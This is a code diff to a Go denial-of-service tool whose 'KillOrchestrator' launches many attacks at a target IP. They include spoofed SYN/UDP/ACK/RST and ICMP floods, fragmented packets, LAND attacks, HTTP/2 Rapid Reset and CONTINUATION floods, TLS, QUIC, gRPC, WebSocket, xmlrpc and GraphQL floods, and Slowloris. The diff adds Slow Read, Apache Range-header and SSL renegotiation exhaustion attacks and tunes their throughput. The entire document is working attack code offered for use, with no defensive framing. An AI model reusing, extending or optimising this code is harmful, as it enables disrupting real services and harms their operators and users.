@@ -115,21 +115,26 @@ func (ko *KillOrchestrator) Run(done chan<- struct{}) {
 func (ko *KillOrchestrator) runL4(targetIP string, targetPort int, size, workers, duration int, spoofPool []string, pool *GoroutineCounter, deadline time.Time) {
 	_ = StartBatchFlood(targetIP, targetPort, 0, workers, size, duration)
 
+	tip32, err := resolveTarget(targetIP)
+	if err != nil { return }
+	tport16 := uint16(targetPort)
+
 	for i := 0; i < workers && i < 1024; i++ {
 		pool.Add()
 		go func() {
 			defer pool.Done()
 			for time.Now().Before(deadline) && !ko.stopped() {
-				spoof := spoofPool[rand.Intn(len(spoofPool))]
-				SendSYN(targetIP, targetPort, spoof)
-				SendUDP(targetIP, targetPort, spoof, size)
-				SendACK(targetIP, targetPort, spoof)
-				SendRST(targetIP, targetPort, spoof)
+				/* Single cgo call replaces 4 per-packet cgo calls */
+				MultiSend(tip32, tport16, 0, 256) /* SYN */
+				MultiSend(tip32, tport16, 1, 256) /* UDP */
+				MultiSend(tip32, tport16, 2, 256) /* ACK */
+				MultiSend(tip32, tport16, 3, 256) /* RST */
+				time.Sleep(time.Microsecond)
 			}
 		}()
 	}
 
-	/* ICMP storm */
+	/* ICMP storm — use legacy path (no batch avail for ICMP yet) */
 	for i := 0; i < 64; i++ {
 		pool.Add()
 		go func() {
@@ -137,6 +142,7 @@ func (ko *KillOrchestrator) runL4(targetIP string, targetPort int, size, workers
 			for time.Now().Before(deadline) && !ko.stopped() {
 				spoof := spoofPool[rand.Intn(len(spoofPool))]
 				SendICMP(targetIP, spoof)
+				time.Sleep(time.Microsecond)
 			}
 		}()
 	}
@@ -150,6 +156,7 @@ func (ko *KillOrchestrator) runL4(targetIP string, targetPort int, size, workers
 				spoof := spoofPool[rand.Intn(len(spoofPool))]
 				SendFragmentedSYN(targetIP, targetPort, spoof)
 				SendFragmentedUDP(targetIP, targetPort, spoof, size)
+				time.Sleep(time.Microsecond)
 			}
 		}()
 	}
@@ -161,6 +168,7 @@ func (ko *KillOrchestrator) runL4(targetIP string, targetPort int, size, workers
 			defer pool.Done()
 			for time.Now().Before(deadline) && !ko.stopped() {
 				StatefulBypassFlood(targetIP, targetPort, spoofPool[rand.Intn(len(spoofPool))])
+				time.Sleep(time.Microsecond)
 			}
 		}()
 	}
@@ -172,6 +180,7 @@ func (ko *KillOrchestrator) runL4(targetIP string, targetPort int, size, workers
 			defer pool.Done()
 			for time.Now().Before(deadline) && !ko.stopped() {
 				SendLAND(targetIP, targetPort)
+				time.Sleep(time.Microsecond)
 			}
 		}()
 	}
@@ -184,6 +193,7 @@ func (ko *KillOrchestrator) runL4(targetIP string, targetPort int, size, workers
 			for time.Now().Before(deadline) && !ko.stopped() {
 				spoof := spoofPool[rand.Intn(len(spoofPool))]
 				H2RapidReset(targetIP, targetPort, spoof, 256)
+				time.Sleep(time.Microsecond)
 			}
 		}()
 	}
@@ -197,6 +207,7 @@ func (ko *KillOrchestrator) runL4(targetIP string, targetPort int, size, workers
 				spoof := spoofPool[rand.Intn(len(spoofPool))]
 				spU32 := parseSpoof(spoof)
 				H2ContinuationFlood(parseSpoof(targetIP), uint16(targetPort), spU32, 500, 10)
+				time.Sleep(time.Microsecond)
 			}
 		}()
 	}
@@ -210,6 +221,7 @@ func (ko *KillOrchestrator) runL4(targetIP string, targetPort int, size, workers
 			for time.Now().Before(deadline) && !ko.stopped() {
 				tcpConn, err := net.DialTimeout("tcp", addr, 5*time.Second)
 				if err != nil {
+					time.Sleep(10 * time.Millisecond)
 					continue
 				}
 				tlsConn := tls.Client(tcpConn, &tls.Config{
@@ -219,6 +231,7 @@ func (ko *KillOrchestrator) runL4(targetIP string, targetPort int, size, workers
 				})
 				if err := tlsConn.Handshake(); err != nil {
 					tcpConn.Close()
+					time.Sleep(10 * time.Millisecond)
 					continue
 				}
 				for attempt := 0; attempt < 100; attempt++ {
@@ -232,6 +245,7 @@ func (ko *KillOrchestrator) runL4(targetIP string, targetPort int, size, workers
 				}
 				tlsConn.Close()
 				tcpConn.Close()
+				time.Sleep(time.Microsecond)
 			}
 		}()
 	}
@@ -250,6 +264,7 @@ func (ko *KillOrchestrator) runL4(targetIP string, targetPort int, size, workers
 			for time.Now().Before(deadline) && !ko.stopped() {
 				pkt := buildQUICInitial()
 				conn.Write(pkt)
+				time.Sleep(time.Microsecond)
 			}
 		}()
 	}
@@ -262,9 +277,10 @@ func (ko *KillOrchestrator) runL4(targetIP string, targetPort int, size, workers
 			addr := fmt.Sprintf("%s:%d", targetIP, targetPort)
 			for time.Now().Before(deadline) && !ko.stopped() {
 				conn, err := net.DialTimeout("tcp", addr, 5*time.Second)
-				if err != nil { continue }
+				if err != nil { time.Sleep(10 * time.Millisecond); continue }
 				conn.Write(buildGRPCUnaryFrame())
 				conn.Close()
+				time.Sleep(time.Microsecond)
 			}
 		}()
 	}
@@ -277,7 +293,7 @@ func (ko *KillOrchestrator) runL4(targetIP string, targetPort int, size, workers
 			addr := fmt.Sprintf("%s:%d", targetIP, targetPort)
 			for time.Now().Before(deadline) && !ko.stopped() {
 				conn, err := net.DialTimeout("tcp", addr, 5*time.Second)
-				if err != nil { continue }
+				if err != nil { time.Sleep(10 * time.Millisecond); continue }
 				key := randStr(16)
 				upgrade := fmt.Sprintf("GET / HTTP/1.1\r\nHost: %s\r\nUpgrade: websocket\r\nConnection: Upgrade\r\nSec-WebSocket-Key: %s==\r\nSec-WebSocket-Version: 13\r\n\r\n", addr, key)
 				conn.Write([]byte(upgrade))
@@ -290,6 +306,7 @@ func (ko *KillOrchestrator) runL4(targetIP string, targetPort int, size, workers
 					if _, err := conn.Write(frame); err != nil { break }
 				}
 				conn.Close()
+				time.Sleep(time.Microsecond)
 			}
 		}()
 	}
@@ -304,16 +321,90 @@ func (ko *KillOrchestrator) runL4(targetIP string, targetPort int, size, workers
 			graphqlPayload := `{"query":"query { __schema { types { name fields { name } } } }"}`
 			for time.Now().Before(deadline) && !ko.stopped() {
 				conn, err := net.DialTimeout("tcp", addr, 5*time.Second)
-				if err != nil { continue }
+				if err != nil { time.Sleep(10 * time.Millisecond); continue }
 				xmlReq := fmt.Sprintf("POST /xmlrpc.php HTTP/1.1\r\nHost: %s\r\nContent-Type: text/xml\r\nContent-Length: %d\r\n\r\n%s", targetIP, len(xmlPayload), xmlPayload)
 				conn.Write([]byte(xmlReq))
 				conn.Close()
 
 				conn2, err := net.DialTimeout("tcp", addr, 5*time.Second)
-				if err != nil { continue }
+				if err != nil { time.Sleep(10 * time.Millisecond); continue }
 				gqlReq := fmt.Sprintf("POST /graphql HTTP/1.1\r\nHost: %s\r\nContent-Type: application/json\r\nContent-Length: %d\r\n\r\n%s", targetIP, len(graphqlPayload), graphqlPayload)
 				conn2.Write([]byte(gqlReq))
 				conn2.Close()
+				time.Sleep(time.Microsecond)
+			}
+		}()
+	}
+
+	/* ─── CPU Exhaustion Workers ────────────────────────────────── */
+	/* Slow Read — exhaust connection table (minimal local CPU) */
+	for i := 0; i < 32; i++ {
+		pool.Add()
+		go func() {
+			defer pool.Done()
+			addr := fmt.Sprintf("%s:%d", targetIP, targetPort)
+			buf := make([]byte, 1)
+			for time.Now().Before(deadline) && !ko.stopped() {
+				conn, err := net.DialTimeout("tcp", addr, 10*time.Second)
+				if err != nil { time.Sleep(100 * time.Millisecond); continue }
+				req := fmt.Sprintf("GET / HTTP/1.1\r\nHost: %s\r\nConnection: keep-alive\r\nUser-Agent: Mozilla/5.0\r\n\r\n", targetIP)
+				conn.Write([]byte(req))
+				for i := 0; i < 10 && time.Now().Before(deadline) && !ko.stopped(); i++ {
+					conn.SetReadDeadline(time.Now().Add(30 * time.Second))
+					conn.Read(buf)
+					time.Sleep(30 * time.Second)
+				}
+				conn.Close()
+			}
+		}()
+	}
+
+	/* Range Flood — Apache CPU burn (1000 overlapping ranges) */
+	for i := 0; i < 16; i++ {
+		pool.Add()
+		go func() {
+			defer pool.Done()
+			addr := fmt.Sprintf("%s:%d", targetIP, targetPort)
+			var rangeHdr string
+			for j := 0; j < 1000; j++ {
+				if j > 0 { rangeHdr += ", " }
+				rangeHdr += fmt.Sprintf("bytes=%d-%d", j*100, j*100+500+j)
+			}
+			tmp := make([]byte, 1024)
+			for time.Now().Before(deadline) && !ko.stopped() {
+				conn, err := net.DialTimeout("tcp", addr, 10*time.Second)
+				if err != nil { time.Sleep(100 * time.Millisecond); continue }
+				req := fmt.Sprintf("GET / HTTP/1.1\r\nHost: %s\r\nRange: %s\r\nUser-Agent: Mozilla/5.0\r\n\r\n", targetIP, rangeHdr)
+				conn.Write([]byte(req))
+				conn.SetReadDeadline(time.Now().Add(5 * time.Second))
+				conn.Read(tmp)
+				conn.Close()
+			}
+		}()
+	}
+
+	/* SSL Reneg — repeated ClientHello after handshake */
+	for i := 0; i < 16; i++ {
+		pool.Add()
+		go func() {
+			defer pool.Done()
+			addr := fmt.Sprintf("%s:%d", targetIP, targetPort)
+			hello := buildFakeClientHello()
+			for time.Now().Before(deadline) && !ko.stopped() {
+				tcpConn, err := net.DialTimeout("tcp", addr, 10*time.Second)
+				if err != nil { time.Sleep(100 * time.Millisecond); continue }
+				tlsConn := tls.Client(tcpConn, &tls.Config{
+					InsecureSkipVerify: true,
+					MaxVersion:         tls.VersionTLS13,
+				})
+				if err := tlsConn.Handshake(); err != nil {
+					tcpConn.Close(); continue
+				}
+				for i := 0; i < 50 && !ko.stopped(); i++ {
+					if _, err := tcpConn.Write(hello); err != nil { break }
+				}
+				tlsConn.Close()
+				tcpConn.Close()
 			}
 		}()
 	}
@@ -335,13 +426,13 @@ func (ko *KillOrchestrator) runHTTPKill(targetIP string, targetPort int, workers
 }
 
 func (ko *KillOrchestrator) runSlowloris(targetIP string, targetPort int, workers, duration int, spoofPool []string, pool *GoroutineCounter, deadline time.Time) {
-	for i := 0; i < workers; i++ {
+	for i := 0; i < workers && i < 512; i++ {
 		pool.Add()
 		go func() {
 			defer pool.Done()
 			for time.Now().Before(deadline) && !ko.stopped() {
 				conn, err := net.DialTimeout("tcp", fmt.Sprintf("%s:%d", targetIP, targetPort), 5*time.Second)
-				if err != nil { continue }
+				if err != nil { time.Sleep(100 * time.Millisecond); continue }
 				conn.Write([]byte("GET / HTTP/1.1\r\nHost: " + targetIP + "\r\nUser-Agent: Mozilla/5.0\r\n"))
 				for time.Now().Before(deadline) && !ko.stopped() {
 					conn.SetWriteDeadline(time.Now().Add(10 * time.Second))
@@ -350,6 +441,7 @@ func (ko *KillOrchestrator) runSlowloris(targetIP string, targetPort int, worker
 					time.Sleep(100 * time.Millisecond)
 				}
 				conn.Close()
+				time.Sleep(10 * time.Millisecond)
 			}
 		}()
 	}
